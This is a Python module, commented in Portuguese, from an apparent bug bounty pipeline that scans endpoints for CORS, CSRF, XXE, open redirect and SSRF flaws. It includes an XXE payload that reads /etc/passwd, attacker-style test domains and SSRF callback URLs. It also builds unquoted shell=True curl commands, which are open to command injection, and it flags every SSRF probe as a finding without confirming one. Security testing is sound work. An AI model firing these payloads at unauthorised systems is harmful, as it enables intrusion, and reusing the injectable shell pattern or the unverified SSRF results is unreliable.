"""
Módulo de testes específicos para a pipeline de Bug Bounty.
Responsável por realizar testes direcionados para vulnerabilidades específicas.
"""

import os
import sys
import time
import json
import tempfile
import random
import requests
from pathlib import Path
from datetime import datetime
from urllib.parse import urlparse, parse_qs

from core.logger import Logger
from core.executor import CommandExecutor
from tools.tool_checker import ToolChecker
from config.tools import get_tools_for_module

class SpecificTests:
    """
    Classe para testes específicos de vulnerabilidades.
    """
    def __init__(self, logger=None, threads=10, timeout=300):
        """
        Inicializa o módulo de testes específicos.
        
        Args:
            logger (Logger, optional): Logger para registrar eventos
            threads (int, optional): Número de threads para execução paralela
            timeout (int, optional): Timeout para comandos externos em segundos
        """
        self.logger = logger or Logger("specific_tests")
        self.executor = CommandExecutor(self.logger)
        self.tool_checker = ToolChecker(self.logger)
        self.threads = threads
        self.timeout = timeout
        
        # Verificar ferramentas necessárias
        self.tools_status = self.tool_checker.check_tools_for_module("specific")
        
        # Resultados
        self.vulnerabilities = []
    
    def run(self, endpoints_file, output_dir):
        """
        Executa testes específicos de vulnerabilidades.
        
        Args:
            endpoints_file (str): Arquivo com lista de endpoints
            output_dir (str): Diretório de saída
            
        Returns:
            dict: Resultados dos testes
        """
        self.logger.info(f"Iniciando testes específicos em {endpoints_file}")
        
        # Verificar arquivo de endpoints
        if not os.path.exists(endpoints_file):
            self.logger.error(f"Arquivo de endpoints não encontrado: {endpoints_file}")
            return {"success": False, "error": "Arquivo de endpoints não encontrado"}
        
        # Criar diretório de saída
        specific_dir = os.path.join(output_dir, "specific")
        os.makedirs(specific_dir, exist_ok=True)
        
        # Arquivo de saída para vulnerabilidades
        vulns_file = os.path.join(specific_dir, "vulnerabilities.json")
        
        try:
            # 1. Testar CORS misconfiguration
            cors_results = self._run_cors_tests(endpoints_file, specific_dir)
            
            # 2. Testar CSRF
            csrf_results = self._run_csrf_tests(endpoints_file, specific_dir)
            
            # 3. Testar XXE
            xxe_results = self._run_xxe_tests(endpoints_file, specific_dir)
            
            # 4. Testar Open Redirect
            open_redirect_results = self._run_open_redirect_tests(endpoints_file, specific_dir)
            
            # 5. Testar SSRF
            ssrf_results = self._run_ssrf_tests(endpoints_file, specific_dir)
            
            # Consolidar resultados
            self._consolidate_results(vulns_file)
            
            # Retornar resultados
            return {
                "success": True,
                "vulnerabilities": self.vulnerabilities,
                "stats": {
                    "total_vulnerabilities": len(self.vulnerabilities),
                    "cors_vulnerabilities": len(cors_results) if cors_results else 0,
                    "csrf_vulnerabilities": len(csrf_results) if csrf_results else 0,
                    "xxe_vulnerabilities": len(xxe_results) if xxe_results else 0,
                    "open_redirect_vulnerabilities": len(open_redirect_results) if open_redirect_results else 0,
                    "ssrf_vulnerabilities": len(ssrf_results) if ssrf_results else 0
                }
            }
        except Exception as e:
            self.logger.error(f"Erro ao executar testes específicos: {str(e)}")
            import traceback
            self.logger.debug(traceback.format_exc())
            return {"success": False, "error": str(e)}
    
    def _run_cors_tests(self, endpoints_file, output_dir):
        """
        Executa testes de CORS misconfiguration.
        
        Args:
            endpoints_file (str): Arquivo com lista de endpoints
            output_dir (str): Diretório de saída
            
        Returns:
            list: Lista de vulnerabilidades encontradas
        """
        self.logger.step("Executando testes de CORS misconfiguration")
        
        # Verificar se o curl está disponível
        if "curl" not in self.tools_status["available"]:
            self.logger.warning("curl não está disponível, pulando testes de CORS")
            return []
        
        # Arquivo de saída para resultados
        cors_output = os.path.join(output_dir, "cors_results.json")
        
        # Limitar número de endpoints para testar
        max_endpoints = 20
        endpoints_sample_file = os.path.join(output_dir, "endpoints_sample.txt")
        command = f"cat {endpoints_file} | sort -R | head -n {max_endpoints} > {endpoints_sample_file}"
        self.executor.execute(command, timeout=10, shell=True)
        
        if not os.path.exists(endpoints_sample_file) or os.path.getsize(endpoints_sample_file) == 0:
            self.logger.warning("Falha ao criar amostra de endpoints para testes de CORS")
            return []
        
        # Ler endpoints da amostra
        with open(endpoints_sample_file, "r") as f:
            endpoints = f.read().splitlines()
        
        # Domínio malicioso para teste
        evil_domain = "evil-cors-test.com"
        
        # Executar testes de CORS para cada endpoint
        vulnerabilities = []
        for endpoint in endpoints:
            self.logger.debug(f"Testando CORS em {endpoint}")
            
            # Extrair domínio do endpoint
            parsed_url = urlparse(endpoint)
            if not parsed_url.netloc:
                continue
            
            # Executar teste de CORS
            command = f"curl -s -I -H 'Origin: https://{evil_domain}' -X OPTIONS {endpoint}"
            result = self.executor.execute(command, timeout=10, shell=True)
            
            if not result["success"]:
                self.logger.debug(f"Falha ao testar CORS em {endpoint}: {result['stderr']}")
                continue
            
            # Verificar cabeçalhos de resposta
            response_headers = result["stdout"].lower()
            
            # Verificar Access-Control-Allow-Origin: *
            if "access-control-allow-origin: *" in response_headers:
                vulnerability = {
                    "name": "CORS Misconfiguration - Wildcard Origin",
                    "url": endpoint,
                    "type": "cors",
                    "severity": "medium",
                    "description": f"O endpoint {endpoint} permite solicitações CORS de qualquer origem (Access-Control-Allow-Origin: *).",
                    "tool": "cors_tester",
                    "raw": response_headers
                }
                
                vulnerabilities.append(vulnerability)
                self.vulnerabilities.append(vulnerability)
                self.logger.alert(f"Vulnerabilidade CORS (wildcard) encontrada em {endpoint}")
            
            # Verificar se o domínio malicioso é permitido
            elif f"access-control-allow-origin: https://{evil_domain}" in response_headers:
                vulnerability = {
                    "name": "CORS Misconfiguration - Reflected Origin",
                    "url": endpoint,
                    "type": "cors",
                    "severity": "high",
                    "description": f"O endpoint {endpoint} reflete a origem maliciosa nas respostas CORS.",
                    "tool": "cors_tester",
                    "raw": response_headers
                }
                
                vulnerabilities.append(vulnerability)
                self.vulnerabilities.append(vulnerability)
                self.logger.alert(f"Vulnerabilidade CORS (reflected) encontrada em {endpoint}")
            
            # Verificar Access-Control-Allow-Credentials: true
            if "access-control-allow-credentials: true" in response_headers and ("access-control-allow-origin: *" in response_headers or f"access-control-allow-origin: https://{evil_domain}" in response_headers):
                vulnerability = {
                    "name": "CORS Misconfiguration - Credentials Allowed",
                    "url": endpoint,
                    "type": "cors",
                    "severity": "high",
                    "description": f"O endpoint {endpoint} permite credenciais em solicitações CORS de origens não confiáveis.",
                    "tool": "cors_tester",
                    "raw": response_headers
                }
                
                vulnerabilities.append(vulnerability)
                self.vulnerabilities.append(vulnerability)
                self.logger.alert(f"Vulnerabilidade CORS (credentials) encontrada em {endpoint}")
        
        # Salvar resultados
        if vulnerabilities:
            try:
                with open(cors_output, "w") as f:
                    json.dump(vulnerabilities, f, indent=2)
                
                self.logger.success(f"Resultados dos testes de CORS salvos em {cors_output}")
            except Exception as e:
                self.logger.error(f"Erro ao salvar resultados dos testes de CORS: {str(e)}")
        
        self.logger.success(f"Encontradas {len(vulnerabilities)} vulnerabilidades CORS")
        return vulnerabilities
    
    def _run_csrf_tests(self, endpoints_file, output_dir):
        """
        Executa testes de CSRF usando XSRFProbe.
        
        Args:
            endpoints_file (str): Arquivo com lista de endpoints
            output_dir (str): Diretório de saída
            
        Returns:
            list: Lista de vulnerabilidades encontradas
        """
        self.logger.step("Executando testes de CSRF com XSRFProbe")
        
        # Verificar se o XSRFProbe está disponível
        xsrfprobe_available = "xsrfprobe" in self.tools_status["available"]
        python_csrf_scanner_available = "xsrfprobe" in self.tools_status["alternatives"] and self.tools_status["alternatives"]["xsrfprobe"] == "python_csrf_scanner"
        
        if not xsrfprobe_available and not python_csrf_scanner_available:
            self.logger.warning("XSRFProbe não está disponível e não há alternativa, tentando instalar automaticamente")
            try:
                install_result = self.executor.execute("pip3 install xsrfprobe", timeout=60, shell=True)
                if install_result["success"]:
                    self.logger.success("XSRFProbe instalado com sucesso")
                    xsrfprobe_available = True
                else:
                    self.logger.error(f"Falha ao instalar XSRFProbe: {install_result.get('stderr', 'Erro desconhecido')}")
                    return []
            except Exception as e:
                self.logger.error(f"Erro ao instalar XSRFProbe: {str(e)}")
                return []
        
        # Arquivo de saída para resultados
        csrf_output = os.path.join(output_dir, "csrf_results.json")
        
        # Extrair domínios dos endpoints
        domains_file = os.path.join(output_dir, "domains.txt")
        try:
            # Extrair domínios únicos dos endpoints
            domains = set()
            with open(endpoints_file, "r") as f:
                for line in f:
                    url = line.strip()
                    if url:
                        parsed_url = urlparse(url)
                        if parsed_url.netloc:
                            domains.add(parsed_url.netloc)
            
            # Salvar domínios em arquivo
            if not domains:
                self.logger.warning("Nenhum domínio válido encontrado para testes de CSRF")
                return []
                
            with open(domains_file, "w") as f:
                for domain in domains:
                    f.write(f"https://{domain}\n")
            
            self.logger.info(f"Extraídos {len(domains)} domínios para testes de CSRF")
        except Exception as e:
            self.logger.error(f"Erro ao extrair domínios para testes de CSRF: {str(e)}")
            return []
        
        vulnerabilities = []
        
        # Usar XSRFProbe se disponível
        if xsrfprobe_available:
            try:
                # Criar diretório para resultados do XSRFProbe
                xsrfprobe_output = os.path.join(output_dir, "xsrfprobe_output")
                os.makedirs(xsrfprobe_output, exist_ok=True)
                
                # Executar XSRFProbe para cada domínio
                for domain in domains:
                    self.logger.info(f"Executando XSRFProbe para o domínio: {domain}")
                    
                    # Comando para executar XSRFProbe
                    command = f"xsrfprobe -u https://{domain} -o {xsrfprobe_output}/{domain.replace('.', '_')}.txt --crawl"
                    
                    try:
                        result = self.executor.execute(command, timeout=300, shell=True)
                        
                        if result["success"]:
                            self.logger.success(f"XSRFProbe concluído para {domain}")
                            
                            # Verificar resultados
                            output_file = f"{xsrfprobe_output}/{domain.replace('.', '_')}.txt"
                            if os.path.exists(output_file):
                                with open(output_file, "r") as f:
                                    content = f.read()
                                    
                                    # Procurar por vulnerabilidades nos resultados
                                    if "CSRF vulnerability found" in content or "CSRF token missing" in content:
                                        # Extrair URLs vulneráveis
                                        import re
                                        urls = re.findall(r'https?://[^\s]+', content)
                                        
                                        for url in urls:
                                            vulnerability = {
                                                "name": "Vulnerabilidade CSRF detectada",
                                                "url": url,
                                                "type": "csrf",
                                                "severity": "high",
                                                "description": f"O XSRFProbe detectou uma vulnerabilidade CSRF em {url}",
                                                "tool": "xsrfprobe",
                                                "raw": content
                                            }
                                            
                                            vulnerabilities.append(vulnerability)
                                            self.vulnerabilities.append(vulnerability)
                                            self.logger.alert(f"Vulnerabilidade CSRF encontrada em {url}")
                        else:
                            self.logger.warning(f"Falha ao executar XSRFProbe para {domain}: {result.get('stderr', 'Erro desconhecido')}")
                    except Exception as e:
                        self.logger.error(f"Erro ao executar XSRFProbe para {domain}: {str(e)}")
            except Exception as e:
                self.logger.error(f"Erro ao executar testes com XSRFProbe: {str(e)}")
        # Usar implementação interna se XSRFProbe não estiver disponível
        else:
            self.logger.info("Usando implementação interna para testes de CSRF")
            
            # Extrair endpoints POST
            post_endpoints_file = os.path.join(output_dir, "post_endpoints.txt")
            
            # Usar grep para encontrar formulários em endpoints
            form_endpoints_file = os.path.join(output_dir, "form_endpoints.txt")
            command = f"cat {endpoints_file} | sort -u > {post_endpoints_file}"
            self.executor.execute(command, timeout=10, shell=True)
            
            if not os.path.exists(post_endpoints_file) or os.path.getsize(post_endpoints_file) == 0:
                self.logger.warning("Nenhum endpoint encontrado para testes de CSRF")
                return []
            
            # Limitar número de endpoints para testar
            max_endpoints = 10
            command = f"head -n {max_endpoints} {post_endpoints_file} > {post_endpoints_file}.tmp && mv {post_endpoints_file}.tmp {post_endpoints_file}"
            self.executor.execute(command, timeout=10, shell=True)
            
            # Ler endpoints
            with open(post_endpoints_file, "r") as f:
                endpoints = f.read().splitlines()
            
            # Executar testes de CSRF para cada endpoint
            for endpoint in endpoints:
                try:
                    self.logger.debug(f"Testando CSRF em {endpoint}")
                    
                    # Verificar se o endpoint tem formulário ou aceita POST
                    command = f"curl -s -X OPTIONS {endpoint} -I"
                    result = self.executor.execute(command, timeout=10, shell=True)
                    
                    if not result["success"]:
                        self.logger.debug(f"Falha ao verificar métodos permitidos em {endpoint}: {result.get('stderr', 'Erro desconhecido')}")
                        continue
                    
                    # Verificar se POST é permitido
                    response_headers = result["stdout"].lower()
                    if "allow:" in response_headers and "post" not in response_headers:
                        self.logger.debug(f"Endpoint {endpoint} não aceita POST, pulando")
                        continue
                    
                    # Verificar cabeçalhos de segurança
                    has_csrf_protection = False
                    
                    # Verificar cabeçalho SameSite
                    if "set-cookie:" in response_headers and "samesite=strict" in response_headers:
                        has_csrf_protection = True
                    
                    # Verificar CSRF token no conteúdo
                    command = f"curl -s {endpoint}"
                    result = self.executor.execute(command, timeout=10, shell=True)
                    
                    if result["success"]:
                        content = result["stdout"].lower()
                        if "csrf" in content or "token" in content or "_token" in content:
                            has_csrf_protection = True
                    
                    # Se não encontrou proteção CSRF, reportar vulnerabilidade
                    if not has_csrf_protection:
                        vulnerability = {
                            "name": "Possível vulnerabilidade CSRF",
                            "url": endpoint,
                            "type": "csrf",
                            "severity": "medium",
                            "description": f"O endpoint {endpoint} pode ser vulnerável a CSRF. Não foram encontradas proteções como tokens CSRF ou cookies SameSite=Strict.",
                            "tool": "python_csrf_scanner",
                            "raw": response_headers
                        }
                        
                        vulnerabilities.append(vulnerability)
                        self.vulnerabilities.append(vulnerability)
                        self.logger.alert(f"Possível vulnerabilidade CSRF encontrada em {endpoint}")
                except Exception as e:
                    self.logger.error(f"Erro ao testar CSRF em {endpoint}: {str(e)}")
        
        # Salvar resultados
        if vulnerabilities:
            try:
                with open(csrf_output, "w") as f:
                    json.dump(vulnerabilities, f, indent=2)
                
                self.logger.success(f"Resultados dos testes de CSRF salvos em {csrf_output}")
            except Exception as e:
                self.logger.error(f"Erro ao salvar resultados dos testes de CSRF: {str(e)}")
        
        self.logger.success(f"Encontradas {len(vulnerabilities)} possíveis vulnerabilidades CSRF")
        return vulnerabilities
    
    def _run_xxe_tests(self, endpoints_file, output_dir):
        """
        Executa testes de XXE.
        
        Args:
            endpoints_file (str): Arquivo com lista de endpoints
            output_dir (str): Diretório de saída
            
        Returns:
            list: Lista de vulnerabilidades encontradas
        """
        self.logger.step("Executando testes de XXE")
        
        # Verificar se o curl está disponível
        if "curl" not in self.tools_status["available"]:
            self.logger.warning("curl não está disponível, pulando testes de XXE")
            return []
        
        # Arquivo de saída para resultados
        xxe_output = os.path.join(output_dir, "xxe_results.json")
        
        # Limitar número de endpoints para testar
        max_endpoints = 10
        endpoints_sample_file = os.path.join(output_dir, "endpoints_sample_xxe.txt")
        command = f"cat {endpoints_file} | sort -R | head -n {max_endpoints} > {endpoints_sample_file}"
        self.executor.execute(command, timeout=10, shell=True)
        
        if not os.path.exists(endpoints_sample_file) or os.path.getsize(endpoints_sample_file) == 0:
            self.logger.warning("Falha ao criar amostra de endpoints para testes de XXE")
            return []
        
        # Ler endpoints da amostra
        with open(endpoints_sample_file, "r") as f:
            endpoints = f.read().splitlines()
        
        # Payload XXE
        xxe_payload = """<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
<!ELEMENT foo ANY >
<!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
<foo>&xxe;</foo>"""
        
        # Executar testes de XXE para cada endpoint
        vulnerabilities = []
        for endpoint in endpoints:
            self.logger.debug(f"Testando XXE em {endpoint}")
            
            # Verificar se o endpoint aceita XML
            command = f"curl -s -X OPTIONS {endpoint} -I"
            result = self.executor.execute(command, timeout=10, shell=True)
            
            if not result["success"]:
                self.logger.debug(f"Falha ao verificar métodos permitidos em {endpoint}: {result['stderr']}")
                continue
            
            # Verificar se POST é permitido
            response_headers = result["stdout"].lower()
            if "allow:" in response_headers and "post" not in response_headers:
                self.logger.debug(f"Endpoint {endpoint} não aceita POST, pulando")
                continue
            
            # Enviar payload XXE
            command = f"curl -s -X POST -H 'Content-Type: application/xml' -d '{xxe_payload}' {endpoint}"
            result = self.executor.execute(command, timeout=10, shell=True)
            
            if not result["success"]:
                self.logger.debug(f"Falha ao testar XXE em {endpoint}: {result['stderr']}")
                continue
            
            # Verificar resposta
            response = result["stdout"]
            
            # Verificar se a resposta contém conteúdo do /etc/passwd
            if "root:" in response or "nobody:" in response:
                vulnerability = {
                    "name": "XML External Entity (XXE) Injection",
                    "url": endpoint,
                    "type": "xxe",
                    "severity": "high",
                    "description": f"O endpoint {endpoint} é vulnerável a XXE. Foi possível ler o arquivo /etc/passwd.",
                    "tool": "xxe_tester",
                    "raw": response
                }
                
                vulnerabilities.append(vulnerability)
                self.vulnerabilities.append(vulnerability)
                self.logger.alert(f"Vulnerabilidade XXE encontrada em {endpoint}")
        
        # Salvar resultados
        if vulnerabilities:
            try:
                with open(xxe_output, "w") as f:
                    json.dump(vulnerabilities, f, indent=2)
                
                self.logger.success(f"Resultados dos testes de XXE salvos em {xxe_output}")
            except Exception as e:
                self.logger.error(f"Erro ao salvar resultados dos testes de XXE: {str(e)}")
        
        self.logger.success(f"Encontradas {len(vulnerabilities)} vulnerabilidades XXE")
        return vulnerabilities
    
    def _run_open_redirect_tests(self, endpoints_file, output_dir):
        """
        Executa testes de Open Redirect.
        
        Args:
            endpoints_file (str): Arquivo com lista de endpoints
            output_dir (str): Diretório de saída
            
        Returns:
            list: Lista de vulnerabilidades encontradas
        """
        self.logger.step("Executando testes de Open Redirect")
        
        # Verificar se o curl está disponível
        if "curl" not in self.tools_status["available"]:
            self.logger.warning("curl não está disponível, pulando testes de Open Redirect")
            return []
        
        # Arquivo de saída para resultados
        redirect_output = os.path.join(output_dir, "open_redirect_results.json")
        
        # Extrair endpoints com parâmetros de redirecionamento
        redirect_params = ["url", "redirect", "redirect_to", "redirecturl", "return", "return_url", "returnurl", "goto", "next", "redir", "redirect_uri", "continue", "destination", "path"]
        
        redirect_endpoints_file = os.path.join(output_dir, "redirect_endpoints.txt")
        
        # Usar grep para encontrar endpoints com parâmetros de redirecionamento
        grep_patterns = "|".join(redirect_params)
        command = f"cat {endpoints_file} | grep -E '[?&]({grep_patterns})=' > {redirect_endpoints_file}"
        self.executor.execute(command, timeout=10, shell=True)
        
        if not os.path.exists(redirect_endpoints_file) or os.path.getsize(redirect_endpoints_file) == 0:
            self.logger.warning("Nenhum endpoint com parâmetros de redirecionamento encontrado")
            return []
        
        # Ler endpoints com parâmetros de redirecionamento
        with open(redirect_endpoints_file, "r") as f:
            redirect_endpoints = f.read().splitlines()
        
        # Domínio malicioso para teste
        evil_domain = "evil-redirect-test.com"
        
        # Executar testes de Open Redirect para cada endpoint
        vulnerabilities = []
        for endpoint in redirect_endpoints:
            self.logger.debug(f"Testando Open Redirect em {endpoint}")
            
            # Extrair parâmetros de redirecionamento
            parsed_url = urlparse(endpoint)
            query_params = parse_qs(parsed_url.query)
            
            # Testar cada parâmetro de redirecionamento
            for param in redirect_params:
                if param in query_params:
                    # Construir URL com payload de redirecionamento
                    base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?"
                    new_params = []
                    
                    for key, values in query_params.items():
                        if key == param:
                            new_params.append(f"{key}=https://{evil_domain}")
                        else:
                            new_params.append(f"{key}={values[0]}")
                    
                    test_url = base_url + "&".join(new_params)
                    
                    # Executar teste de redirecionamento
                    command = f"curl -s -I -L {test_url}"
                    result = self.executor.execute(command, timeout=10, shell=True)
                    
                    if not result["success"]:
                        self.logger.debug(f"Falha ao testar Open Redirect em {test_url}: {result['stderr']}")
                        continue
                    
                    # Verificar se houve redirecionamento para o domínio malicioso
                    response_headers = result["stdout"].lower()
                    if f"location: https://{evil_domain}" in response_headers:
                        vulnerability = {
                            "name": "Open Redirect",
                            "url": endpoint,
                            "type": "open_redirect",
                            "severity": "medium",
                            "description": f"O endpoint {endpoint} é vulnerável a Open Redirect através do parâmetro '{param}'.",
                            "tool": "open_redirect_tester",
                            "raw": response_headers
                        }
                        
                        vulnerabilities.append(vulnerability)
                        self.vulnerabilities.append(vulnerability)
                        self.logger.alert(f"Vulnerabilidade Open Redirect encontrada em {endpoint}")
                        
                        # Não precisamos testar outros parâmetros para este endpoint
                        break
        
        # Salvar resultados
        if vulnerabilities:
            try:
                with open(redirect_output, "w") as f:
                    json.dump(vulnerabilities, f, indent=2)
                
                self.logger.success(f"Resultados dos testes de Open Redirect salvos em {redirect_output}")
            except Exception as e:
                self.logger.error(f"Erro ao salvar resultados dos testes de Open Redirect: {str(e)}")
        
        self.logger.success(f"Encontradas {len(vulnerabilities)} vulnerabilidades Open Redirect")
        return vulnerabilities
    
    def _run_ssrf_tests(self, endpoints_file, output_dir):
        """
        Executa testes de SSRF.
        
        Args:
            endpoints_file (str): Arquivo com lista de endpoints
            output_dir (str): Diretório de saída
            
        Returns:
            list: Lista de vulnerabilidades encontradas
        """
        self.logger.step("Executando testes de SSRF")
        
        # Verificar se o curl está disponível
        if "curl" not in self.tools_status["available"]:
            self.logger.warning("curl não está disponível, pulando testes de SSRF")
            return []
        
        # Arquivo de saída para resultados
        ssrf_output = os.path.join(output_dir, "ssrf_results.json")
        
        # Extrair endpoints com parâmetros que podem levar a SSRF
        ssrf_params = ["url", "uri", "path", "file", "document", "resource", "redirect", "src", "source", "data", "reference", "site", "html", "endpoint"]
        
        ssrf_endpoints_file = os.path.join(output_dir, "ssrf_endpoints.txt")
        
        # Usar grep para encontrar endpoints com parâmetros que podem levar a SSRF
        grep_patterns = "|".join(ssrf_params)
        command = f"cat {endpoints_file} | grep -E '[?&]({grep_patterns})=' > {ssrf_endpoints_file}"
        self.executor.execute(command, timeout=10, shell=True)
        
        if not os.path.exists(ssrf_endpoints_file) or os.path.getsize(ssrf_endpoints_file) == 0:
            self.logger.warning("Nenhum endpoint com parâmetros que podem levar a SSRF encontrado")
            return []
        
        # Limitar número de endpoints para testar
        max_endpoints = 10
        command = f"head -n {max_endpoints} {ssrf_endpoints_file} > {ssrf_endpoints_file}.tmp && mv {ssrf_endpoints_file}.tmp {ssrf_endpoints_file}"
        self.executor.execute(command, timeout=10, shell=True)
        
        # Ler endpoints com parâmetros que podem levar a SSRF
        with open(ssrf_endpoints_file, "r") as f:
            ssrf_endpoints = f.read().splitlines()
        
        # Servidor de callback para teste
        callback_domain = "ssrf-test.requestcatcher.com"
        
        # Executar testes de SSRF para cada endpoint
        vulnerabilities = []
        for endpoint in ssrf_endpoints:
            self.logger.debug(f"Testando SSRF em {endpoint}")
            
            # Extrair parâmetros que podem levar a SSRF
            parsed_url = urlparse(endpoint)
            query_params = parse_qs(parsed_url.query)
            
            # Testar cada parâmetro que pode levar a SSRF
            for param in ssrf_params:
                if param in query_params:
                    # Construir URL com payload de SSRF
                    base_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?"
                    new_params = []
                    
                    for key, values in query_params.items():
                        if key == param:
                            # Gerar um ID único para este teste
                            test_id = ''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789', k=8))
                            new_params.append(f"{key}=http://{test_id}.{callback_domain}")
                        else:
                            new_params.append(f"{key}={values[0]}")
                    
                    test_url = base_url + "&".join(new_params)
                    
                    # Executar teste de SSRF
                    command = f"curl -s {test_url}"
                    result = self.executor.execute(command, timeout=10, shell=True)
                    
                    # Não precisamos verificar o resultado, pois o callback será assíncrono
                    
                    # Adicionar como possível vulnerabilidade
                    vulnerability = {
                        "name": "Possível Server-Side Request Forgery (SSRF)",
                        "url": endpoint,
                        "type": "ssrf",
                        "severity": "medium",
                        "description": f"O endpoint {endpoint} pode ser vulnerável a SSRF através do parâmetro '{param}'. Foi enviada uma solicitação para {callback_domain}.",
                        "tool": "ssrf_tester",
                        "raw": f"Teste ID: {test_id}"
                    }
                    
                    vulnerabilities.append(vulnerability)
                    self.vulnerabilities.append(vulnerability)
                    self.logger.alert(f"Possível vulnerabilidade SSRF encontrada em {endpoint}")
                    
                    # Não precisamos testar outros parâmetros para este endpoint
                    break
        
        # Salvar resultados
        if vulnerabilities:
            try:
                with open(ssrf_output, "w") as f:
                    json.dump(vulnerabilities, f, indent=2)
                
                self.logger.success(f"Resultados dos testes de SSRF salvos em {ssrf_output}")
            except Exception as e:
                self.logger.error(f"Erro ao salvar resultados dos testes de SSRF: {str(e)}")
        
        self.logger.success(f"Encontradas {len(vulnerabilities)} possíveis vulnerabilidades SSRF")
        return vulnerabilities
    
    def _consolidate_results(self, vulns_file):
        """
        Consolida os resultados dos testes específicos.
        
        Args:
            vulns_file (str): Arquivo para salvar vulnerabilidades
        """
        self.logger.step("Consolidando resultados dos testes específicos")
        
        # Contar vulnerabilidades por tipo
        type_counts = {}
        for vuln in self.vulnerabilities:
            vuln_type = vuln.get("type", "unknown")
            if vuln_type not in type_counts:
                type_counts[vuln_type] = 0
            type_counts[vuln_type] += 1
        
        # Registrar contagem
        for vuln_type, count in type_counts.items():
            self.logger.info(f"Vulnerabilidades {vuln_type}: {count}")
        
        # Salvar vulnerabilidades em arquivo JSON
        try:
            with open(vulns_file, "w") as f:
                json.dump(self.vulnerabilities, f, indent=2)
            
            self.logger.success(f"Vulnerabilidades salvas em {vulns_file}")
        except Exception as e:
            self.logger.error(f"Erro ao salvar vulnerabilidades: {str(e)}")